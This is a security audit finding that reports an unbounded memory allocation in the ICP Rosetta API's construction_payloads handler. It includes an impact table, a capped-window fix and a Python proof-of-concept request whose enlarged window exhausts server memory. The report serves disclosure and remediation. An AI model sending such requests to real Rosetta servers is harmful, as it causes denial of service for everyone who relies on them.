### Title
Unbounded Memory Allocation via Unchecked `ingress_start`/`ingress_end` Window in `construction_payloads` — (`rs/rosetta-api/icp/src/request_handler/construction_payloads.rs`)

### Summary
The `construction_payloads` handler accepts attacker-controlled `ingress_start` and `ingress_end` values with no upper-bound validation. The interval loop iterates once per 2-minute sub-window, pushing entries into unbounded `Vec`s. A single unauthenticated HTTP request with a large window causes the Rosetta server to allocate gigabytes of memory and crash.

### Finding Description

The loop at lines 99–107 computes the step interval as:

```
interval = MAX_INGRESS_TTL - PERMITTED_DRIFT - 120s
         = 300s - 60s - 120s = 120s (2 minutes)
``` [1](#0-0) [2](#0-1) 

The loop then runs with no iteration cap:

```rust
let mut now = ingress_start;
while now < ingress_end {
    ingress_expiries.push(...);
    now += interval;
}
``` [3](#0-2) 

For every entry in `ingress_expiries`, `add_payloads` pushes **2** `SigningPayload` structs (one update payload + one read-state payload) per operation type: [4](#0-3) 

The `ConstructionPayloadsRequestMetadata` struct declares `ingress_start` and `ingress_end` as plain `Option<u64>` with **no range or delta validation**: [5](#0-4) 

There is no guard anywhere between request parsing and the loop.

### Impact Explanation

| Window | Iterations | `SigningPayload` entries (~200 B each) | Approx. heap |
|---|---|---|---|
| 7 days | 5,040 | 10,080 | ~2 MB |
| 1 year | 262,800 | 525,600 | ~105 MB |
| 10 years | 2,628,000 | 5,256,000 | ~1 GB |
| `u64::MAX` ns (~584 yr) | ~153 M | ~306 M | ~30 GB+ |

A single request with `ingress_end = ingress_start + u64::MAX` exhausts all available memory, crashing the Rosetta server and causing a complete denial of service for all users of the ICP Rosetta API.

### Likelihood Explanation

- No authentication is required to call `POST /construction/payloads`.
- The payload is a small, well-formed JSON object — trivial to craft.
- The effect is immediate and deterministic (single request, single thread).
- The Rosetta server is a long-running public service; a crash requires operator intervention to recover.

### Recommendation

Add an explicit cap on the ingress window before the loop, e.g.:

```rust
const MAX_INGRESS_WINDOW: Duration = Duration::from_secs(24 * 3600); // 24 hours
if ingress_end > ingress_start + MAX_INGRESS_WINDOW {
    return Err(ApiError::invalid_request(
        "ingress_end - ingress_start exceeds the maximum allowed window"
    ));
}
```

Alternatively, cap `ingress_expiries.len()` after the loop and return an error if exceeded.

### Proof of Concept

```python
import requests, time

now_ns = int(time.time() * 1e9)
seven_days_ns = 7 * 24 * 3600 * int(1e9)

payload = {
  "network_identifier": {"blockchain": "Internet Computer", "network": "00000000000000020101"},
  "operations": [{"operation_identifier": {"index": 0}, "type": "TRANSACTION",
                  "account": {"address": "<valid_address>"},
                  "amount": {"value": "-100000000", "currency": {"symbol": "ICP", "decimals": 8}}}],
  "public_keys": [{"hex_bytes": "<valid_pubkey_hex>", "curve_type": "edwards25519"}],
  "metadata": {
    "ingress_start": now_ns,
    "ingress_end":   now_ns + seven_days_ns   # 5040 iterations; scale N for more
  }
}

r = requests.post("http://<rosetta-host>:8080/construction/payloads", json=payload)
print(len(r.json()["payloads"]))  # expect ~10080; server OOM at large N
```

Increasing `seven_days_ns` linearly increases server memory consumption until the process is killed by the OOM killer.
